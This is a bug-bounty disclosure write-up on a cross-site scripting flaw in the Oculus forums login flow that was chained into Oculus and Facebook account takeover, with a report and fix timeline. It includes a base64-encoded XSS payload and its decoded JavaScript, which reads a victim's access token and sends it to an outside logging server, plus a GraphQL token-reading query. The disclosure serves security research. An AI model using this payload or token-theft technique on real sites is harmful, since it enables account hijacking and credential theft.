---
id: 525
title: 'XSS on forums.oculusvr.com leads to Oculus and Facebook account takeovers'
date: '2021-01-01T14:54:41+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=525'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

This bug could allow an attacker to steal a first party Oculus access token which would allow him to access the victim account. This is achieved by exploiting a cross-site scripting bug in forums.oculusvr.com.

**Technical Details**

This was possible because **forums.oculusvr.com** domain uses **oculus.com** authentication mechanism to login users to the forum using **https://graph.oculus.com/authenticate_web_application/** endpoint which would redirect him to **https://forums.oculusvr.com/entry/oculus** with an oculus access_token that could access **graph.oculus.com/graphql** and make GraphQL mutations/queries that allow him to takeover the account.  
  
The forums.oculus.com domain is out of scope in the Facebook program according to the program [policy page](https://www.facebook.com/whitehat/) since it hosts a third party web application (Vanilla Forums). However, this bug was found in the authentication flow added by Facebook to the forum to allow Oculus users to access it without the need to create a new account in the forum.

The code served in **<https://forums.oculusvr.com/entry/oculus>** had debug mode enabled and if we check the script embedded **[https://forums.oculusvr.com/plugins/oculus/js/oculus-oauth.js](https://forums.oculusvr.com/plugins/oculus/js/oculus-oauth.js?fbclid=IwAR1n1it_ukn7ckI0LdKXSs2tk0T3brVFgQjpHl65vchBfwrhVDbOYsM2MZ4)**, we’d notice that if the debug mode is enabled, it would unsafely use document.write to add the content of the state parameter inside the fragment part of the URL (#state=PAYLOAD) to the document.

```javascript
var oculusConnect = function(params) {
     if (typeof params === "undefined") {
         return;
     }
 `if (typeof params.connect === "undefined") {`
`return;`
` } `
`var response = decodeURIComponent(document.location.hash);`
`var hash = response.substring(response.indexOf("#") + 1, response.indexOf("&")); `
`var queryString = response.replace("#" + hash, ""); `
`var queryStringSplit = queryString.split("&"); `
`var state = getParam(queryStringSplit, "state"); `
`var savedState = params.connect.savedState; `
`var hashSplit = hash.split("="); `
`var hashKey = hashSplit[0]; `
`var hashValue = hashSplit[1]; `
`var loginType = this.frameElement.id; `

`if (params.connect.debug) {     `
`document.write("login type : " + loginType + `
`";<br >document location:" + document.location + `
`";<br >Saved State:" + savedState + `
`";<br >State:" + state + `
`";<br >Hash Key:" +  hashKey); `
`}`
...
```

```javascript
 document.addEventListener("DOMContentLoaded", function() {
        var params = {
            "connect":
                {
                    "debug" : "1" ,
                    "savedState": "G1H7LE7UOJ" ,
                    "authorizeUrl": "https://graph.oculus.com/authenticate_web_application" ,
                    "oculusHash": "X" ,
                    "associationKey": "OC|1238816349468370|" ,
                    "webAddress": "https://forums.oculusvr.com"
                }
        }
oculusConnect(params);
```

Notice that we used the “state” to serve our payload although document.location is passed too to document.write, this is intended since document.location would have the URL encoded format of the payload however “state” would have a decoded format since it was extracted “response” which used decodeURIComponent method to decode the hash fragment.  
  
To this point, this seems like an easy XSS however if one read the code carefully you’ll notice that `<strong>var loginType = this.frameElement.id;</strong>` was added before the usage of the document.write. This is bad since this line of code would return an error “**TypeError: Cannot read property ‘id’ of null**” which is obvious since frameElement would exist only if the current page is iframed and the parent window is same-origin.   
To solve this problem, we should find a way to iframe the page [**https://forums.oculusvr.com/entry/oculus**\#state=payload](https://forums.oculusvr.com/entry/oculus#state=payload) inside forums.oculusvr.com and send the final link with the iframe to the targeted user.  
  
**Embeds in Vanilla Forums**  
  
Vanilla forums allows embeds from a list of whitelisted websites as shows the code snippet from one of the files in the source code (Legacy function however the new embedding methods had basically the same code and checks) :

```php
    public function unembedContent(string $content): string {
        if ($this->embedConfig->isYoutubeEnabled()) {
            $content = preg_replace(
                '`<iframe.*src="https?://.*youtube\.com/embed/([a-z0-9_-]*)".*</iframe>`i',
                "\nhttps://www.youtube.com/watch?v=$1\n",
                $content
            );
            $content = preg_replace(
                '`<object.*value="https?://.*youtube\.com/v/([a-z0-9_-]*)[^"]*".*</object>`i',
                "\nhttps://www.youtube.com/watch?v=$1\n",
                $content
            );

        }

        if ($this->embedConfig->isVimeoEnabled()) {
            $content = preg_replace(
                '`<iframe.*src="((https?)://.*vimeo\.com/video/([0-9]*))".*</iframe>`i',
                "\n$2://vimeo.com/$3\n",
                $content
            );
            $content = preg_replace(
                '`<object.*value="((https?)://.*vimeo\.com.*clip_id=([0-9]*)[^"]*)".*</object>`i',
                "\n$2://vimeo.com/$3\n",
                $content
            );
        }
        if ($this->embedConfig->isGettyEnabled()) {
            $content = preg_replace(
                '`<iframe.*src="(https?:)?//embed\.gettyimages\.com/embed/([\w=?&+-]*)" width="([\d]*)" height="([\d]*)".*</iframe>`i',
                "\nhttp://embed.gettyimages.com/$2/$3/$4\n",
                $content
            );
        }
        return $content;
    }
    private function getEmbedRegexes(): array {
        return [
            'YouTube' => [
                'regex' => [
                    // Warning: Very long regex.
                    '/https?:\/\/(?:(?:www.)|(?:m.))?(?:(?:youtube.com)|(?:youtu.be))\/(?:(?:playlist?)'
                    . '|(?:(?:watch\?v=)?(?P<videoId>[\w-]{11})))(?:\?|\&)?'
                    . '(?:list=(?P<listId>[\w-]*))?(?:t=(?:(?P<minutes>\d*)m)?(?P<seconds>\d*)s)?(?:#t=(?P<start>\d*))?/i'
                ],
            ],

            'Twitter' => [
                'regex' => ['/https?:\/\/(?:www\.)?twitter\.com\/(?:#!\/)?(?:[^\/]+)\/status(?:es)?\/([\d]+)/i'],
            ],
            'Vimeo' => [
                'regex' => ['/https?:\/\/(?:www\.)?vimeo\.com\/(?:channels\/[a-z0-9]+\/)?(\d+)/i'],
            ],
            'Vine' => [
                'regex' => ['/https?:\/\/(?:www\.)?vine\.co\/(?:v\/)?([\w]+)/i'],
            ],
            'Instagram' => [
                'regex' => ['/https?:\/\/(?:www\.)?instagr(?:\.am|am\.com)\/p\/([\w-]+)/i'],
            ],
            'Pinterest' => [
                'regex' => [
                    '/https?:\/\/(?:www\.)?pinterest\.com\/pin\/([\d]+)/i',
                    '/https?:\/\/(?:www\.)?pinterest\.ca\/pin\/([\d]+)/i',
                ],
            ],
            'Getty' => [
                'regex' => ['/https?:\/\/embed.gettyimages\.com\/([\w=?&;+-_]*)\/([\d]*)\/([\d]*)/i'],
            ],
            'Twitch' => [
                'regex' => ['/https?:\/\/(?:www\.)?twitch\.tv\/([\w]+)$/i'],
            ],
            'TwitchRecorded' => [
                'regex' => ['/https?:\/\/(?:www\.)?twitch\.tv\/videos\/(\w+)$/i'],
            ],
            'Soundcloud' => [
                'regex' => ['/https?:(?:www\.)?\/\/soundcloud\.com\/([\w=?&;+-_]*)\/([\w=?&;+-_]*)/i'],
            ],
            'Gifv' => [
                'regex' => ['/https?:\/\/i\.imgur\.com\/([a-z0-9]+)\.gifv/i'],
            ],
            'Wistia' => [
                'regex' => [
                    // Format1
                    '/https?:\/\/(?:[A-za-z0-9\-]+\.)?(?:wistia\.com|wi\.st)\/.*?'
                    . '\?wvideo=(?<videoID>([A-za-z0-9]+))(\?wtime=(?<time>((\d)+m)?((\d)+s)?))?/i',
                    // Format2

                    '/https?:\/\/([A-za-z0-9\-]+\.)?(wistia\.com|wi\.st)\/medias\/(?<videoID>[A-za-z0-9]+)'
                    . '(\?wtime=(?<time>((\d)+m)?((\d)+s)?))?/i',
                ],
            ],
        ];
    }
}
```

A bug was found in one of these whitelisted websites which allowed me to redirect from the embedded page in Vanilla Forums to the url **https://forums.oculusvr.com/entry/oculus** with the XSS payload. Unfortunately this bug won’t be discussed here :’).

**Exploitation**

Login with your Oculus account to **forums.oculus.com** , go to “**New Discussion**” and click “**Toggle Html View**“, and add this payload. This was changed of course so you won’t identify where the second bug was found based on previous regular expressions :’)

```markup
<iframe src="https://REDACTED/REDACTED" />
```

and click on “Preview” then “Post Discussion” . This would create a thread which contains an iframe with REDACTED as source. The page in REDACTED would exploit the bug which would redirect us inside the iframe to final URL that would exploit the XSS.

The payload for the XSS that would steal the Oculus user access_token is as follow:

```markup
https://forums.oculusvr.com/entry/oculus/#access_token=test&state=<script>
eval(atob("dmFyIGlmcm0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTtpZnJ
tLnNldEF0dHJpYnV0ZSgnaWQnLCAndGVzdCcpO2lmcm0uc2V0QXR0cmlidXRlKCdzcmMnLCAna
HR0cHM6Ly9ncmFwaC5vY3VsdXMuY29tL2F1dGhlbnRpY2F0ZV93ZWJfYXBwbGljYXRpb24/YWN
jZXNzX3Rva2VuPU9DJTdDMTIzODgxNjM0OTQ2ODM3MCU3QyZyZWRpcmVjdF91cmk9aHR0cHMlM
0ElMkYlMkZmb3J1bXMub2N1bHVzdnIuY29tJTJGZW50cnklMkZvY3VsdXMmc3RhdGU9VjFIVzl
TMkxHWiZtZXRob2Q9cG9zdCcpO2lmcm0ub25sb2FkID0gZnVuY3Rpb24oKXthbGVydChkb2N1b
WVudC5nZXRFbGVtZW50QnlJZCgndGVzdCcpLmNvbnRlbnRXaW5kb3cubG9jYXRpb24uaHJlZil
9O2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZybSk7"));</script>
```

The second payload was base64 encoded since it contains some characters (=, &amp; ) that would mess the splitting done in **oculusConnect** to extract the state part. The origin one is :

```javascript
var ifrm = document.createElement('iframe');
ifrm.setAttribute('id', 'test');
ifrm.setAttribute('src', 'https://graph.oculus.com/authenticate_web_application?access_token=OC|1238816349468370|&redirect_uri=https://forums.oculusvr.com/entry/oculus&state=V1HW9S2LGZ&method=post');
ifrm.onload = function(){
       var token = document.getElementById('test').contentWindow.location.href;
       fetch("https://logging-server/log.php?x=" + token);
};
document.body.appendChild(ifrm);
```

We create another iframe which would request **https://graph.oculus.com/authenticate_web_application**, this would redirect to **https://forums.oculusvr.com/entry/oculus** with a valid access_token. Since the iframe and parent are same-origin, we can access the iframe window and read location.href. We’ll send the access_token to our logging server.

**Account takeover of Oculus and Facebook accounts**

Tokens generated with the “Oculus Forums” application with id 1238816349468370 had access to **https://graph.oculus.com/graphql** which allows it to make GraphQL mutations/queries. However, account takeover wasn’t possible since changing password, adding contactpoints or changing pin required the knowledge of the user PIN. Also the application didn’t have access to read the linked Facebook account access_token (From [JOSIP FRANJKOVIĆ](https://www.josipfranjkovic.com/) blog who discovered this trick and used before) and this query returned **null** :

```javascript
https://graph.oculus.com/graphql?access_token=VICTIM_TOKEN&method=post
&q=viewer(){linked_accounts_info{facebook_account{<strong>access_token</strong>}}}
```

The access_token disclosed seemed useful after all to only read some user information or edit/view user owned applications/organisations.   
Fortunately, i was able to find a third bug (feature?) which allowed me to upgrade the access_token to the context of another application ( WWW 752908224809889 ) and bypass limited permissions of the previous application. This application had the ability to read the linked Facebook access_token which allowed me to first Takeover the Facebook account ( like described in Josip blog post ) or use the Facebook access_token to login to the Oculus account using the endpoint <https://graph.oculus.com/fbauth>.

**Disclaimer**  
Although this bug was cool to find and exploit which resulted in a critical vulnerability, i always advice to follow the program policy and hunt for bugs in only in-scope domains. Facebook clearly stated that this bug was an exception because ,to my opinion, it was found in the code added by Facebook and not the third-party web application code.

**Timeline**

Nov 24, 2020— Report Sent   
Nov 24, 2020— Acknowledged by Facebook  
Dec 1, 2020— Fixed by Facebook  
Dec 17, 2020 — $30K (including bonus) bounty awarded by Facebook.